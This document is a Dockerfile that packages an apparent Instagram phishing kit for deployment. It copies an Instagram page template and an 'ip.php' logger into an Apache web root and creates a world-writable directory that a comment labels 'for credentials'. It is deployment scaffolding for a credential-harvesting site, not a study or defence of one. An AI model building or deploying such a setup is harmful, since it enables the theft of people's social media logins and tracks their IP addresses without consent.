# Use PHP with Apache
FROM php:apache

# Copy your Instagram template to the web root
COPY .sites/instagram /var/www/html/
COPY .sites/ip.php /var/www/html/

# Create auth directory for credentials
RUN mkdir -p /var/www/html/auth && chmod 777 /var/www/html/auth

# Fix permissions - THIS IS THE KEY FIX
RUN chown -R www-data:www-data /var/www/html/ && \
    chmod -R 755 /var/www/html/ && \
    chmod 644 /var/www/html/index.php

# Enable Apache modules
RUN a2enmod rewrite

# Ensure index.php is the default
RUN echo "DirectoryIndex index.php" > /etc/apache2/conf-available/directory-index.conf && \
    a2enconf directory-index

EXPOSE 80

# Start Apache
CMD ["apache2-foreground"]
